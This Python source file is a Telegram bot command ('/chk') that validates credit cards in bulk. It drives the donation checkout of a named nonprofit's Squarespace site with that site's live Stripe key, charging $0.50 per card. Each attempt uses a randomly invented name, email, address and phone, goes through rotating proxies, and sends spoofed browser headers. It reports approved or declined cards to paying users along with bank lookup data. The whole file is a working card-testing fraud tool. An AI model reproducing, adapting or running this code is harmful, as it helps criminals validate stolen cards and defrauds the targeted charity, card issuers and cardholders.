import aiohttp
import asyncio
import time
import re
import json
import random
import string
import uuid
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🦇 LIVELIHOODNW.ORG — SQUARESPACE + STRIPE GATE 🦇
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BASE_URL        = "https://livelihoodnw.org"
STRIPE_PK       = "pk_live_51HaUnuDu7KhQIzIklfjMKv75dJw5tiJrYa3nouY2pD05DtgcPbZ4gkJZ7ScifFOZ3YNVBD8PlQSJ476tn6PVilB600Un5V8Dcw"
STRIPE_ACCOUNT  = "acct_1HaUnuDu7KhQIzIk"
WEBSITE_ID      = "5d093b7c7ff6500001c3a4ae"
FUND_ID         = "362a32ea-7720-4a1e-92a6-b2a727afeaae"
DONATE_AMOUNT   = 50   # cents — $0.50 minimum donation
GATE_NAME       = "Sǫᴜᴀʀᴇꜱᴘᴀᴄᴇ 💳 🟢"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RANDOM IDENTITY DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FIRST_NAMES = ["James","John","Robert","Michael","David","William","Richard","Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Linda","Barbara","Elizabeth","Susan","Jessica","Sarah","Karen","Daniel","Matthew","Anthony","Mark","Steven","Andrew","Joshua","Kevin","Brian","Edward"]
LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson"]
EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","aol.com","icloud.com"]
US_CITIES   = [("Seattle","WA","98101"),("Portland","OR","97201"),("Tacoma","WA","98401"),("Bellevue","WA","98004"),("Spokane","WA","99201"),("Olympia","WA","98501"),("Boise","ID","83701"),("Eugene","OR","97401"),("Salem","OR","97301"),("Vancouver","WA","98660")]
US_STREETS  = ["1900 SE 15th St","1234 Main Street","5678 Oak Avenue","9012 Pine Boulevard","3456 Maple Drive","7890 Cedar Lane","2345 Elm Street","6789 Birch Road","0123 Walnut Court","4567 Willow Way"]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY LOADER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def load_proxies():
    try:
        out = []
        with open("px.txt", "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if not line.startswith("http") and not line.startswith("socks"):
                    line = "http://" + line
                out.append(line)
        return out
    except FileNotFoundError:
        return []

PROXIES = load_proxies()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USER DATA HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_user_data(user_id, context):
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {"name":"User","credits":150,"plan":"TRIAL","expires":0,"pre_premium_credits":0}
    return context.bot_data["user_data"][uid]

def is_user_premium(ud):
    raw = ud.get("plan","TRIAL").upper()
    if raw == "TRIAL":
        return False
    if ud.get("expires",0) <= time.time():
        ud["plan"] = "TRIAL"; ud["credits"] = ud.get("pre_premium_credits",150); ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan):
    p = raw_plan.upper()
    if p == "CORE":  return "✨ Cᴏʀᴇ ✨"
    if p == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    if p == "ROOT":  return "👑 Rᴏᴏᴛ 👑"
    return "Tʀɪᴀʟ"

async def _check_force_sub(user_id, context):
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left","kicked"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 0 — GET CRUMB FROM HOMEPAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def get_crumb(session, proxy):
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "sec-ch-ua": '"Google Chrome";v="149","Chromium";v="149","Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    }
    async with session.get(f"{BASE_URL}/", headers=headers, proxy=proxy, timeout=20) as resp:
        await resp.read()

    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb_cookie = cookies.get("crumb")
    if not crumb_cookie:
        raise Exception("CRUMB_NOT_FOUND — site did not set crumb cookie")
    return crumb_cookie.value

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 1 — POST DONATION → GET CART TOKEN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def get_cart_token(session, crumb, proxy):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": BASE_URL,
        "pragma": "no-cache",
        "referer": f"{BASE_URL}/donate",
        "sec-ch-ua": '"Google Chrome";v="149","Chromium";v="149","Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "x-csrf-token": crumb,
    }
    payload = {
        "amount": {"value": DONATE_AMOUNT, "currencyCode": "USD"},
        "donationFrequency": "ONE_TIME",
        "feeAmount": None,
    }
    url = f"{BASE_URL}/api/v1/fund-service/websites/{WEBSITE_ID}/donations/funds/{FUND_ID}"
    async with session.post(url, headers=headers, json=payload, proxy=proxy, timeout=20) as resp:
        data = await resp.json(content_type=None)

    if "type" in data:
        raise Exception(f"DONATION_API_ERROR: {data.get('type','UNKNOWN')} — {json.dumps(data)[:120]}")

    redir = data.get("redirectUrlPath","")
    m = re.search(r"cartToken=([^&\s]+)", redir)
    if not m:
        raise Exception(f"CART_TOKEN_NOT_FOUND in response: {json.dumps(data)[:120]}")
    return m.group(1)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 2 — VISIT CHECKOUT → GET xsrfToken + grandTotal (+ refresh crumb)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def get_checkout_data(session, cart_token, proxy):
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "referer": f"{BASE_URL}/donate",
        "sec-ch-ua": '"Google Chrome";v="149","Chromium";v="149","Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    }
    async with session.get(
        f"{BASE_URL}/checkout?cartToken={cart_token}",
        headers=headers, proxy=proxy, timeout=20,
    ) as resp:
        html = await resp.text()

    # Refresh crumb (may have rotated after checkout visit)
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    crumb_cookie = cookies.get("crumb")
    crumb = crumb_cookie.value if crumb_cookie else None

    # xsrfToken
    xsrf = None
    for pat in [
        r'"xsrfToken"\s*:\s*"([^"]+)"',
        r'xsrfToken["\s:]+([A-Za-z0-9+/=_|-]{20,})',
    ]:
        m = re.search(pat, html)
        if m:
            xsrf = m.group(1)
            break

    # grandTotal decimalValue
    grand_total = None
    for pat in [
        r'"grandTotal"\s*:\s*\{[^}]*"decimalValue"\s*:\s*"([^"]+)"',
        r'"decimalValue"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, html)
        if m:
            grand_total = m.group(1)
            break

    if not xsrf:
        raise Exception("XSRF_TOKEN_NOT_FOUND in checkout page")
    if not grand_total:
        raise Exception("GRAND_TOTAL_NOT_FOUND in checkout page")

    return crumb, xsrf, grand_total

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 3 — TOKENIZE CARD ON STRIPE → pm_xxx
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def create_stripe_pm(session, card_data, full_name, email, address_info, proxy):
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": '"Google Chrome";v="149","Chromium";v="149","Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    }

    cn     = card_data["card_number"]
    cn_fmt = " ".join([cn[i:i+4] for i in range(0, len(cn), 4)])
    street, city, state, zip_code = address_info

    guid = str(uuid.uuid4()).replace("-","") + "10e650"
    muid = str(uuid.uuid4())
    sid  = str(uuid.uuid4())
    csid = str(uuid.uuid4())
    esid = "elements_session_" + "".join(random.choices(string.ascii_letters + string.digits, k=12))
    ecid = str(uuid.uuid4())

    data = {
        "billing_details[address][city]":        city,
        "billing_details[address][country]":     "US",
        "billing_details[address][line1]":        street,
        "billing_details[address][line2]":        "",
        "billing_details[address][postal_code]":  zip_code,
        "billing_details[address][state]":        state,
        "billing_details[name]":                  full_name,
        "billing_details[email]":                 email,
        "type":                                   "card",
        "card[number]":                           cn_fmt,
        "card[cvc]":                              card_data["cvv"],
        "card[exp_year]":                         card_data["year"],
        "card[exp_month]":                        card_data["month"],
        "allow_redisplay":                        "unspecified",
        "payment_user_agent":                     "stripe.js/39914d4bef; stripe-js-v3/39914d4bef; payment-element; deferred-intent",
        "referrer":                               BASE_URL,
        "time_on_page":                           str(random.randint(200000, 500000)),
        "client_attribution_metadata[client_session_id]":                      csid,
        "client_attribution_metadata[merchant_integration_source]":            "elements",
        "client_attribution_metadata[merchant_integration_subtype]":           "payment-element",
        "client_attribution_metadata[merchant_integration_version]":           "2021",
        "client_attribution_metadata[payment_intent_creation_flow]":           "deferred",
        "client_attribution_metadata[payment_method_selection_flow]":          "merchant_specified",
        "client_attribution_metadata[elements_session_id]":                    esid,
        "client_attribution_metadata[elements_session_config_id]":             ecid,
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "guid":                                   guid,
        "muid":                                   muid,
        "sid":                                    sid,
        "key":                                    STRIPE_PK,
        "_stripe_account":                        STRIPE_ACCOUNT,
    }

    async with session.post(
        "https://api.stripe.com/v1/payment_methods",
        headers=headers, data=data, proxy=proxy, timeout=20,
    ) as resp:
        rj = await resp.json(content_type=None)

    if "error" in rj:
        err  = rj["error"]
        code = err.get("code","unknown")
        msg  = err.get("message","Unknown error")
        dc   = err.get("decline_code","")

        if code == "card_declined":
            return None, f"DECLINED | {dc.upper() if dc else 'CARD_DECLINED'} - {msg}"
        elif code == "incorrect_number":      return None, "ERROR | INVALID_CARD_NUMBER"
        elif code == "invalid_expiry_year":   return None, "ERROR | INVALID_EXPIRY_YEAR"
        elif code == "invalid_expiry_month":  return None, "ERROR | INVALID_EXPIRY_MONTH"
        elif code == "invalid_cvc":           return None, "ERROR | INVALID_CVV"
        elif code == "expired_card":          return None, f"DECLINED | EXPIRED_CARD - {msg}"
        elif code == "incorrect_cvc":         return None, "ERROR | INCORRECT_CVV"
        elif code == "processing_error":      return None, "ERROR | PROCESSING_ERROR"
        elif code == "incorrect_zip":         return None, "DECLINED | ZIP_MISMATCH"
        else:
            if "declin" in msg.lower():
                return None, f"DECLINED | {msg.upper()}"
            return None, f"ERROR | {code.upper()}: {msg}"

    pm_id = rj.get("id","")
    if not pm_id.startswith("pm_"):
        return None, f"ERROR | TOKENIZATION_FAILED — {json.dumps(rj)[:80]}"
    return {"id": pm_id}, None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STEP 4 — SUBMIT ORDER → REAL SITE RESPONSE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def submit_order(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total, proxy):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": BASE_URL,
        "pragma": "no-cache",
        "referer": f"{BASE_URL}/checkout?cartToken={cart_token}",
        "sec-ch-ua": '"Google Chrome";v="149","Chromium";v="149","Not)A;Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-model": '""',
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-platform-version": '"19.0.0"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "x-csrf-token": crumb or "",
        "x-siteuser-xsrf-token": xsrf or "",
    }

    fn = full_name.split()[0]
    ln = " ".join(full_name.split()[1:]) if " " in full_name else ""
    street, city, state, zip_code = address_info
    phone = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"

    payload = {
        "email": email,
        "subscribeToList": True,
        "shippingAddress": {"id":"","firstName":"","lastName":"","line1":"","line2":"","city":"","region":state,"postalCode":"","country":"","phoneNumber":""},
        "createNewUser": False,
        "newUserPassword": None,
        "saveShippingAddress": False,
        "makeDefaultShippingAddress": False,
        "customFormData": None,
        "shippingAddressId": None,
        "proposedAmountDue": {"decimalValue": grand_total, "currencyCode": "USD"},
        "cartToken": cart_token,
        "paymentToken": {"stripePaymentTokenType": "PAYMENT_METHOD_ID", "token": pm["id"], "type": "STRIPE"},
        "reCaptchaToken": None,
        "billToShippingAddress": False,
        "billingAddress": {"id":"","firstName":fn,"lastName":ln,"line1":street,"line2":"","city":city,"region":state,"postalCode":zip_code,"country":"US","phoneNumber":phone},
        "savePaymentInfo": False,
        "makeDefaultPayment": False,
        "paymentCardId": None,
        "universalPaymentElementEnabled": True,
    }

    async with session.post(
        f"{BASE_URL}/api/2/commerce/orders",
        headers=headers, json=payload, proxy=proxy, timeout=30,
    ) as resp:
        try:
            rj = await resp.json(content_type=None)
        except Exception:
            raw = await resp.text()
            return "ERROR", f"INVALID_JSON_RESPONSE: {raw[:100]}"

    # ── Parse every real response type ──
    ss       = rj.get("submissionStatus","").upper()
    ft       = rj.get("failureType","")
    ek       = rj.get("errorKey","")
    ec       = rj.get("errorCodes",[])
    order_id = rj.get("id") or rj.get("orderId") or rj.get("orderNumber")

    if order_id or ss == "ORDER_CONFIRMED":
        return "CHARGED", f"ORDER_CONFIRMED ✅ | OrderID: {order_id or 'N/A'}"
    elif ft:
        msg = ft
        if ek:          msg += f" | {ek}"
        if ec:          msg += f" | {', '.join(ec)}"
        return "DECLINED", f"DECLINED | {msg}"
    elif ss:
        return "DECLINED", f"{ss} | {json.dumps(rj)[:150]}"
    else:
        return "DECLINED", json.dumps(rj)[:200]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /chk COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return
    if not context.bot_data.get("chk_on", True):
        await update.message.reply_text(
            "⚠️ Sǫᴜᴀʀᴇꜱᴘᴀᴄᴇ gate is currently <b>OFF</b>.", parse_mode="HTML"
        )
        return

    # Force-join check
    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML",
        )
        return

    # ── Parse card input ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        rt = update.message.reply_to_message
        text = rt.text or rt.caption or ""
        m = re.search(r"(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})", text)
        if m:
            card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/chk cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n<code>/chk 4111111111111111|12|26|123</code>",
            parse_mode="HTML",
        )
        return

    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
        )
        return

    cc_num, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[-2:]
    card_data = {"card_number": cc_num, "month": mm.zfill(2), "year": yy, "cvv": cvv}

    ud      = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\nRedeem a code with /rm or buy a plan.\n━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)],
                ]),
            )
            return
        ud["credits"] -= 1

    msg        = await update.message.reply_text("⏳ <b>[ 𖥷iТ ] ➺ Pʀᴏᴄᴇꜱꜱɪɴɢ...</b>", parse_mode="HTML")
    start_time = time.time()
    bin_num    = cc_num[:6]

    try:
        proxy   = random.choice(PROXIES) if PROXIES else None
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Step 0: homepage → crumb
            crumb = await get_crumb(session, proxy)

            # Step 1: POST donation → cartToken
            cart_token = await get_cart_token(session, crumb, proxy)

            # Step 2: visit checkout → xsrf + grandTotal + refresh crumb
            crumb, xsrf, grand_total = await get_checkout_data(session, cart_token, proxy)

            # Random identity
            fn, ln    = random.choice(FIRST_NAMES), random.choice(LAST_NAMES)
            full_name = f"{fn} {ln}"
            email     = f"{fn.lower()}{ln.lower()}{random.randint(1,99999)}@{random.choice(EMAIL_DOMAINS)}"
            city_data = random.choice(US_CITIES)
            addr_info = (random.choice(US_STREETS), city_data[0], city_data[1], city_data[2])

            # Step 3: tokenize on Stripe
            pm, stripe_err = await create_stripe_pm(session, card_data, full_name, email, addr_info, proxy)

            if stripe_err:
                # Real Stripe response — not a site decline yet
                if "DECLINED" in stripe_err:
                    status_ui    = "Dᴇᴄʟɪɴᴇᴅ ❌"
                else:
                    status_ui    = "Eʀʀᴏʀ ⚠️"
                raw_response = stripe_err
            else:
                # Step 4: submit order → real site response
                status, raw_response = await submit_order(
                    session, cart_token, pm, full_name, email,
                    crumb, xsrf, addr_info, grand_total, proxy,
                )
                status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "CHARGED" else "Dᴇᴄʟɪɴᴇᴅ ❌"

        # BIN lookup
        bin_data = await get_bin_info(bin_num)
        bin_txt  = "N/A"
        if not bin_data.get("error"):
            s       = str(bin_data.get("scheme","N/A")).upper()
            b       = bin_data.get("bank","N/A")
            country = str(bin_data.get("country","N/A")).upper()
            flag    = bin_data.get("country_emoji","")
            bin_txt = f"{s} - {b} - {flag} {country}"

        plan_ui  = get_styled_plan(ud.get("plan","TRIAL"))
        username = user.first_name or "User"
        elapsed  = f"{time.time() - start_time:.2f}"

        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"🔍 ➺ <code>{card_str}</code>\n"
            f"<b>Gᴀᴛᴇ</b> ➺ {GATE_NAME}\n"
            f"<b>Rᴀᴡ</b>  ➺ {escape(str(raw_response))}\n"
            f"<b>Iɴꜰᴏ</b> ➺ {bin_txt}\n"
            f"<b>Uꜱᴇʀ</b> ➺ {escape(username)} ({plan_ui})\n"
            f"<b>Tɪᴍᴇ</b> ➺ {elapsed}s\n"
            f"<b>Pʀᴏ</b>  ➺ Batman⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"📢 @Batcardchk"
        )
        await msg.edit_text(
            text, parse_mode="HTML",
            reply_markup=kb_result(premium),
            disable_web_page_preview=True,
        )

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            "<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
            "Site took too long to respond. Try again.\n━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )
    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(str(e)[:200])}</code>\n━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )


def get_chk_handler():
    return CommandHandler("chk", cmd_chk)
